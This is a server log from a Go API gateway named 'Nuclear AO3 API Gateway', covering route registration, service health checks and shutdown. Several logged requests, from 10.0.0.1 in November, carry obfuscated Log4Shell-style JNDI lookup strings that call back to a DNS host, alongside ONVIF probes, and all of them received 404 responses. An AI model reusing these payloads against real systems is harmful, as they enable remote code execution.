2025/10/29 12:27:06 No .env file found, using system environment variables
2025/10/29 12:27:06 🔧 Initializing Nuclear AO3 API Gateway...
2025/10/29 12:27:06 ✅ Redis connected successfully
2025/10/29 12:27:06 ✅ API Gateway initialized successfully
[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
 - using env:	export GIN_MODE=release
 - using code:	gin.SetMode(gin.ReleaseMode)

[GIN-debug] GET    /health                   --> main.(*APIGateway).HealthCheck-fm (6 handlers)
[GIN-debug] GET    /metrics                  --> main.setupRouter.WrapH.func4 (6 handlers)
[GIN-debug] GET    /status                   --> main.(*APIGateway).ServiceStatus-fm (6 handlers)
[GIN-debug] POST   /graphql                  --> main.(*APIGateway).GraphQLHandler-fm (7 handlers)
[GIN-debug] GET    /graphql                  --> main.(*APIGateway).GraphQLPlaygroundHandler-fm (6 handlers)
[GIN-debug] GET    /graphql/ws               --> main.(*APIGateway).GraphQLSubscriptionHandler-fm (6 handlers)
[GIN-debug] GET    /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] POST   /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] PUT    /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] DELETE /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/auth/*path        --> main.(*APIGateway).ProxyToAuth-fm (8 handlers)
[GIN-debug] GET    /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/works             --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/works/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] POST   /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] PUT    /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] DELETE /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/tags/*path        --> main.(*APIGateway).ProxyToTag-fm (8 handlers)
[GIN-debug] GET    /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] POST   /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] PUT    /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] DELETE /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/search/*path      --> main.(*APIGateway).ProxyToSearch-fm (8 handlers)
[GIN-debug] GET    /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/my/*path          --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/users/*path       --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/series/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/collections/*path --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/bookmarks/*path   --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/comments/*path    --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] GET    /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] POST   /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PUT    /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] PATCH  /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] HEAD   /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] OPTIONS /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] DELETE /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] CONNECT /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
[GIN-debug] TRACE  /api/v1/pseuds/*path      --> main.(*APIGateway).ProxyToWork-fm (8 handlers)
2025/10/29 12:27:06 🚀 Nuclear AO3 API Gateway starting on port 8080
2025/10/29 12:27:06 📊 GraphQL Playground: http://localhost:8080/graphql
2025/10/29 12:27:06 📈 Metrics: http://localhost:8080/metrics
2025/10/29 12:27:06 ✅ auth-service is healthy (response time: 5.097667ms)
2025/10/29 12:27:06 ✅ tag-service is healthy (response time: 5.792416ms)
2025/10/29 12:27:06 ✅ work-service is healthy (response time: 6.216333ms)
2025/10/29 12:27:06 ✅ search-service is healthy (response time: 9.661375ms)
2025/10/29 12:28:12 CORS: Origin  not in allowed list
[GATEWAY] 2025/10/29 - 12:28:12 | 200 |    1.472292ms |             ::1 | GET     "/health"
2025/10/29 13:54:40 CORS: Origin  not in allowed list
[GATEWAY] 2025/10/29 - 13:54:40 | 200 |    17.84425ms |             ::1 | GET     "/health"
2025/10/29 14:23:12 CORS: Origin  not in allowed list
[GATEWAY] 2025/10/29 - 14:23:12 | 200 |    2.406875ms |             ::1 | GET     "/health"
2025/10/29 14:38:53 CORS: Origin  not in allowed list
[GATEWAY] 2025/10/29 - 14:38:53 | 200 |    7.938417ms |             ::1 | GET     "/health"
2025/11/03 16:30:25 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/03 - 16:30:25 | 404 |    1.163042ms |        10.0.0.1 | POST    "/onvif/device_service"
2025/11/03 16:30:35 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/03 - 16:30:35 | 404 |      72.208µs |        10.0.0.1 | GET     "/"
2025/11/03 16:30:37 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/03 - 16:30:37 | 404 |      74.667µs |        10.0.0.1 | GET     "/${jn${::-d}i${lower::}d${env:TEST:-n}s://10.0.0.1:41264/kVrwzOvUJdcgyfquCdAnrDPJlYsDSznX}"
2025/11/03 16:30:47 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/03 - 16:30:47 | 404 |     145.041µs |        10.0.0.1 | POST    "/"
2025/11/10 16:30:26 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/10 - 16:30:26 | 404 |    1.451208ms |        10.0.0.1 | POST    "/onvif/device_service"
2025/11/10 16:30:37 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/10 - 16:30:37 | 404 |      67.833µs |        10.0.0.1 | GET     "/"
2025/11/10 16:30:39 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/10 - 16:30:39 | 404 |      18.542µs |        10.0.0.1 | GET     "/${${env:TEST:-j}n${::-d}${::-i}:d${::-n}s://10.0.0.1:56039/xHVkvkEsTThQNbtGtXdSBGlYAbaYIHCs}"
2025/11/10 16:30:49 CORS: Origin  not in allowed list
[GATEWAY] 2025/11/10 - 16:30:49 | 404 |      12.917µs |        10.0.0.1 | POST    "/"
2025/11/12 14:16:45 🛑 Shutting down API Gateway...
2025/11/12 14:16:45 ✅ API Gateway exited cleanly
